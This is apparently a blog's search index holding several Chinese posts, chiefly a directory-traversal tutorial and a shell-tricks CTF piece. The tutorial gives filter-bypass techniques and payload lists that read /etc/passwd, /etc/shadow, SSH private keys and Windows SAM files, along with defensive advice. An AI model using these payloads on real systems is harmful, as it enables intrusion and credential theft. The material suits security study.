<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JAVA WEB 坑</title>
      <link href="2021/04/25/Java-Web-%E5%9D%91/"/>
      <url>2021/04/25/Java-Web-%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>开个新坑，学 Java web 了，慢慢更了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈目录穿越</title>
      <link href="2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
      <url>2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>目录遍历（目录穿越）是一个Web安全漏洞，攻击者可以利用该漏洞读取运行应用程序的服务器上的任意文件。 这可能包括应用程序代码和数据，后端系统的登录信息以及敏感的操作系统文件</p><p>在某些情况下，攻击者可能能够在服务器上写入任意文件，（如，FFFTP 是一款小型的 FTP 客户端软件。FFFTP客户端没有正确地验证 FTP 服务器所返回的 LIST 命令响应中包含有目录遍历序列（斜线）的文件名，如果用户受骗从恶意的 FTP 服务器下载的目录包含有带有恶意文件名的文件的话，就可能导致向用户系统的任意位置写入文件）从而允许他们修改应用程序数据或行为，并最终完全控制服务器</p><h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><h2 id="0x00-基础目录遍历"><a href="#0x00-基础目录遍历" class="headerlink" title="0x00 基础目录遍历"></a>0x00 基础目录遍历</h2><p>直接利用 ../ 返回上一级来遍历任意文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x01-绝对路径"><a href="#0x01-绝对路径" class="headerlink" title="0x01 绝对路径"></a>0x01 绝对路径</h2><p>web网站有时候会采取目录遍历的防御措施，如过滤 ../ 上一级等关键字，然后简单的过滤通常会被绕过。有时候可以直接采用绝对路径，无须 ../ 返回上一级目录遍历</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x02-双写-绕过"><a href="#0x02-双写-绕过" class="headerlink" title="0x02 双写../绕过"></a>0x02 双写../绕过</h2><p>有时候，防御措施是直接将 ../ 替换为空，可以直接采用双写直接绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x03-URL编码绕过"><a href="#0x03-URL编码绕过" class="headerlink" title="0x03 URL编码绕过"></a>0x03 URL编码绕过</h2><p>也可以采用 URL 编码来绕过服务器对 . 或者 / 的检测</p><blockquote><p>.  =&gt; %2c</p><p>/  =&gt; %2f</p><p>% =&gt; %25 (双重URL编码)</p></blockquote><h2 id="0x04-绝对路径配合"><a href="#0x04-绝对路径配合" class="headerlink" title="0x04 绝对路径配合 ../"></a>0x04 绝对路径配合 ../</h2><p>有些 web 在获取文件时，会首先判断是否以一个固定的路径开头</p><p>那么就可以配合 ../ 来返回上一级遍历任意文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x05-截断文件后缀"><a href="#0x05-截断文件后缀" class="headerlink" title="0x05 截断文件后缀"></a>0x05 截断文件后缀</h2><p>某些 web 对文件类型作了限制，只有当后缀为图片时才解析</p><p>这时候就可以利用 %00 来截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00.jpg</span><br></pre></td></tr></table></figure><h2 id="0x0x"><a href="#0x0x" class="headerlink" title="0x0x"></a>0x0x</h2><p>要读取根目录下的文件的话 ../ 可以随意拼接任意个，就像 ../../../../../../../../../../../../../../../../../../../../../../</p><p>因为到了根目录再返回上级目录依然是根目录</p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>防止文件路径遍历漏洞的最有效方法是避免将用户提供的输入完全传递给文件系统API</p><p>如果认为不可避免的是将用户提供的输入传递给文件系统 API，则应同时使用两层防御，以防止受到攻击：</p><blockquote><ul><li>应用程序应在处理之前验证用户输入。理想情况下，验证应与允许值的白名单进行比较。如果所需的功能无法做到这一点，则验证应验证输入内容仅包含允许的内容，例如纯字母数字字符</li><li>验证提供的输入后，应用程序应将输入附加到基本目录，并使用平台文件系统 API 规范化路径。验证规范化路径以预期的基本目录开头</li></ul></blockquote><h1 id="攻击路径整理"><a href="#攻击路径整理" class="headerlink" title="攻击路径整理"></a>攻击路径整理</h1><h2 id="文件整理"><a href="#文件整理" class="headerlink" title="文件整理"></a>文件整理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc\hosts #Win10</span><br><span class="line">C:\boot.int  #Win7 隐藏文件</span><br><span class="line">web.xml  #Java Web项目配置文件  </span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">C:\Program Files\mysql\my.ini  #Mysql下配置文件</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;.htaccess</span><br><span class="line">&#x2F;phpinfo.php</span><br><span class="line">&#x2F;inc&#x2F;db.php</span><br><span class="line">&#x2F;inc&#x2F;conn.php</span><br><span class="line">&#x2F;Windows&#x2F;system.ini</span><br><span class="line"></span><br><span class="line"># Tomcat</span><br><span class="line">&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># Windows + IIS + asp</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;scripts&#x2F;..%5c..&#x2F;Windows&#x2F;System32&#x2F;cmd.exe?&#x2F;c+dir+c:\  # 老版本 - IIS CGI文件名解码漏洞</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;show.asp?view&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Windows&#x2F;system.ini</span><br></pre></td></tr></table></figure><h2 id="路径整理"><a href="#路径整理" class="headerlink" title="路径整理"></a>路径整理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">xx.php?vt&#x3D;&amp;cate&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;doc&#x2F;index?md&#x3D;diagnose_api&amp;app&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;pcheck&#x2F;index.php?action&#x3D;showPcheck&amp;report&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;xx&#x2F;img.php?s&#x3D;16,40&amp;n&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;2xx.xx.xx.xx:8080&#x2F;xampp&#x2F;showcode.php&#x2F;c:xampp&#x2F;htdocs&#x2F;xampp&#x2F;showcode.php?showcode&#x3D;1</span><br><span class="line">https:&#x2F;&#x2F;xx.xx.com&#x2F;static&#x2F;images&#x2F;couch-ipad.png..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;frame_scc&#x2F;downLoad?template&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.12.22.xx&#x2F;downloadFile.do?fileName&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="CVE-2014-3625"><a href="#CVE-2014-3625" class="headerlink" title="CVE-2014-3625"></a>CVE-2014-3625</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;passwd </span><br><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-1271"><a href="#CVE-2018-1271" class="headerlink" title="CVE-2018-1271"></a>CVE-2018-1271</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;spring-mvc-showcase&#x2F;resources&#x2F;xxx&#x2F;..%5c&#x2F;..%5c&#x2F;..%5c&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><h2 id="路径遍历检测"><a href="#路径遍历检测" class="headerlink" title="路径遍历检测"></a>路径遍历检测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;known_hosts</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;root&#x2F;.bash_history</span><br><span class="line">&#x2F;root&#x2F;.mysql_history</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;fd[0-9]*(文件标识符)</span><br><span class="line">&#x2F;proc&#x2F;mounts</span><br><span class="line">&#x2F;proc&#x2F;config.gz&#x2F;etc&#x2F;my.cnf</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD</span><br><span class="line">C:\Windows\php.in</span><br><span class="line">C:\Windows\my.ini</span><br><span class="line">C:\boot.int</span><br><span class="line">C:\Windows\System32\inetsrc\MetaBase.xml</span><br><span class="line">C:\Windows\repair\sam</span><br><span class="line">..&#x2F;..&#x2F;ierp&#x2F;bin&#x2F;prop.xml</span><br></pre></td></tr></table></figure><h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Apache</span><br><span class="line">在httpd.conf文件中找到   Options +Indexes +FollowSymLinks +ExecCGI  并修改成   Options -Indexes+FollowSymLinks +ExecCGI  并保存</span><br><span class="line"></span><br><span class="line">Tomcat</span><br><span class="line">修改conf&#x2F;web.xml，将true 改为false 重启tomcat</span><br><span class="line"></span><br><span class="line">IIS</span><br><span class="line">1、在服务器端，打开 控制面板 --&gt;管理工具--&gt; IIS管理器</span><br><span class="line">2、右击默认网站 --&gt; 属性--&gt; 主目录 --&gt;取消“目录浏览”复选框</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小谈性知觉偏差导致蜜汁自信</title>
      <link href="2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/"/>
      <url>2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<p>人生三大错觉：📱振动、👴能反杀（👴确实可以反杀，确实可以啊！）、她喜欢👴</p><p>”Ta喜欢👴为甚么还不承认“，或许可以用性知觉偏差来解释。</p><p>虽然按理来说”Ta明明暗恋我，就是不肯勇敢承认自己的感情“这种错觉是不分男女的，但是一般来说基本上是男性占比多，对于一个普通的、正常的、友好的表示，男性普遍性地容易误解为爱情，在两性中虽然都会有认知不正确的时候，但是男性更容易产生这种Ta喜欢我的夸大型性知觉偏差。</p><hr><p>心理学家做过的研究：</p><p>​    找一些男女大学生来观看某个录像，录像内容是一个教授和一个女学生谈话，女学生想要论文延期，教授和女学生交流得比较友好，嗷，两个演技很精湛的演员也注意了仅仅只是表现友好，不要表现得轻浮和挑逗。</p><p>结果：</p><p>​    女生们：录像中只看到女孩子的友好，关于性感、性诱惑这类的没看出来，而男生们则纷纷表示看出来这个女孩子明显有性方面的展现和诱惑。</p><p>另外的一个研究：</p><p>​    看的是两个男女同学互相在学习的照片，然后图片中的女孩子对这个男的有没有意思。</p><p>结果：</p><p>​    大部分女生看到（觉得）没有啊，两个人很正常啊，但男生一看不对，这个女孩子对这个男孩子有意思，有意思，肯定有意思哈，男生们普遍认为照片中的女孩子心不在焉，心不在学习，表现出了很明显的性感和对男孩子的诱惑。</p><hr><p>这些偏差也并不只适用于普信男（普通而又自信），也适用于一些具有较高配偶价值的人，就比如男领导，事业有成型男人更容易产生这种错觉，欸，👴的女下属这些人对👴有意思奥，所以一些工作场景中的性骚扰问题也源于此 。</p><p>女性明明只是一种友好的表示，但对方却往往可以误解为她是对我心有所属，更有意思的是，当男性遇到漂亮的性感的女性的时候更容易产生这种偏差，主要想一想，人家漂亮的妹子择偶标准都已经够高了，为甚么就这么那啥而不知呢。</p><p>其原因就在于漫长的人类进化过程中，我们知道，两性从进化的根源上来讲，Ta们的性选择、择偶策略是不同的，女性由于孩子的抚养等问题需要一个稳定有资源的男士，所以女性在择偶中都是很慎重的，而男性则不然，Ta在整个生殖过程所负担的并不是那么多，所以男性会追求更多的异性，在更多的两性欢愉之中才能提升自己基因传递下去的比率。</p><p>对于男性而言，Ta对女性的情感认知容易犯两方面错误，一是对方对👴没意思，而👴觉得对方有意思，这是一种误报，另外是对方对👴有意思，而👴判断Ta没意思，这是一种漏报，两种错误权衡下来，男性做出的选择是：宁可误报，不可漏报，宁可错杀一千，不能放过一个。</p><p>进化的动力让男性把任何的女性的好感都解释为性方面的兴趣，所以有了典型的微笑当爱情这种搞法，说白了，这一类的男性呢，就是用下半身思考的动物。</p><p>不过最后还是说一句，并不是所有的男性都是这个样子，本文也只是图一乐，开开玩笑，调侃几句。</p><p>差不多得了，溜之。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些shell的骚操作</title>
      <link href="2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
      <url>2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="构造任意数字"><a href="#构造任意数字" class="headerlink" title="构造任意数字"></a>构造任意数字</h1><p>很久之前无意间发现 <code>$(())</code> 这个好玩的玩意儿，有过一波深♂入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(()) = 0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">((~$(()))) = -1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="comment"># = 0</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> $((!<span class="variable">$#</span>)) = 1 (似乎不彳亍)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">##&#125; = 1</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>)) = 2</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#0&#125; = 4</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过二进制 11 转换为十进制得到 3,4,5,6,7</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))<span class="comment">#$&#123;##&#125;$&#123;##&#125;)) = 3</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">((<span class="variable">$&#123;##&#125;</span>&lt;&lt;$((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>)))) = 4</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))<span class="comment">#$&#123;##&#125;0$&#123;##&#125;)) = 5</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))<span class="comment">#$&#123;##&#125;$&#123;##&#125;0)) = 6</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))<span class="comment">#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;)) = 7</span></span></span><br></pre></td></tr></table></figure><h2 id="利用-以及数字构造任意数"><a href="#利用-以及数字构造任意数" class="headerlink" title="利用 $ ( ) # 以及数字构造任意数"></a>利用 $ ( ) # 以及数字构造任意数</h2><p><code>$((2#1000001)) = 53</code></p><p>形式: <code>$((2#&#123;二进制&#125;))) = &#123;八进制&#125;</code></p><h2 id="利用-构造任意数"><a href="#利用-构造任意数" class="headerlink" title="利用 $ ( ) ~ 构造任意数"></a>利用 $ ( ) ~ 构造任意数</h2><p>以 <code>$(($(($a))$(($b))$(($c))$(($d))$(($e))$(($f))))</code> 为例子吧：</p><h3 id="含有任何负数的情况"><a href="#含有任何负数的情况" class="headerlink" title="含有任何负数的情况"></a>含有任何负数的情况</h3><p>只要有任意 <code>$(($n))</code> 为负数，则表达式的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果是正数，则拼接到前一位的末尾</span><br><span class="line">如果是负数，则与前面分开</span><br></pre></td></tr></table></figure><p>比如：<code>$(($((1))$((0))$((-1))$((1))$((2))$((1))))</code> 的情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 1 0 -1 1 2 1</span><br><span class="line">=&gt; (10) + (-1121)</span><br><span class="line">=&gt; -1111</span><br></pre></td></tr></table></figure><p>或者：<code>$(($((-1))$((0))$((-1))$((1))$((2))$((1))))</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((-<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; -1 0 -1 1 2 1</span><br><span class="line">=&gt; (-10) + (-1121)</span><br><span class="line">=&gt; -1131</span><br></pre></td></tr></table></figure><p>亦或者：<code>$(($((6))$((0))$((-1))$((1))$((-3))$((1))))</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">6</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((-<span class="number">3</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 6 0 -1 1 -3 1</span><br><span class="line">=&gt; (60) + (-11) + (-31)</span><br><span class="line">=&gt; 18</span><br></pre></td></tr></table></figure><h3 id="a-为-0-的情况"><a href="#a-为-0-的情况" class="headerlink" title="$(($a)) 为 0 的情况"></a>$(($a)) 为 0 的情况</h3><p>当 <code>$(($a))</code> 为 0，且其它都为非负数时，整个表达式的结果最后为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">f * 2 ** 0 + <span class="variable">$e</span> * 2 ** 3 + <span class="variable">$d</span> * 2 ** 6 + <span class="variable">$c</span> * 2 ** 9 ······</span></span><br><span class="line">即从最后的 $(($n)) 开始，往前推，直到第一位</span><br></pre></td></tr></table></figure><h3 id="全部为正数的情况"><a href="#全部为正数的情况" class="headerlink" title="全部为正数的情况"></a>全部为正数的情况</h3><p>如果所有的 <code>$(($n))</code> 都为正数，则全部拼接在一起输出……</p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>前不久想折磨一下大一新生，特意去研究了一下</p><p>现在抛出一个问题：现在👴试图读出 /flag.txt 文件，但是👴被限制了字符，只允许使用如下字符，怎解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; $ ? : ; . &#123; &#125; ~</span><br><span class="line">A D E F H I L M N O P R T S U V</span><br></pre></td></tr></table></figure><p>我们首先看一下，没有小写字母，直接执行命令是不可能的，然后只能想到利用 <code>/bin/cat</code> 这一类的来尝试一下，但是 / 也被过滤了，这个时候我们就要思考一下 / 从哪里来了</p><p>给了大写字母和 $ { } 可以尝试一下利用环境变量，env 这个指令可以获取环境变量，不同人的机子不一样，环境变量也不一样，可能会有所出入，但是我的是 ok 的，所以相信大家的都 ok</p><p>因为 <code>PATH</code> 是 <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</code>，所以我们可以尝试取它的第一位，就可以获得 / 了，然后又有 <code>SHELL</code> 为 <code>/bin/bash</code>，所以我们也可以尝试取它的前五位，就是 <code>/bin/</code>，然后就只要考虑后面用哪个命令读取了，但是问题就来了，题目并没有给👴数字，那👴怎么办呢，很简单</p><hr><p>shell 中运行的每个命令都使用退出状态码（exit status）来告诉shell 它完成了处理。退出状态码是一个 0 ~ 255 之间的整数值，在命令结束运行时由命令传给shell</p><p>Linux 使用了 $? 这个专属变量来保存上个执行的命令的退出状态码</p><hr><p>所以我们可以利用 $?  来榨取一个数字，但是我们可以榨取到哪个数字呢，又是否对我们的操作有帮助呢</p><p>Linux 的错误状态退出状态码没有什么标准可遵循，但有一些参考</p><table><thead><tr><th>状态码</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>命令成功结束</td></tr><tr><td>1</td><td>一般性未知错误</td></tr><tr><td>2</td><td>不适合的 shell 命令</td></tr><tr><td>123</td><td>命令不可执行</td></tr><tr><td>127</td><td>没找到命令</td></tr><tr><td>128</td><td>无效退出参数</td></tr><tr><td>128+x</td><td>与 Linux 信号x相关的严重错误</td></tr><tr><td>130</td><td>通过 ctrl+c 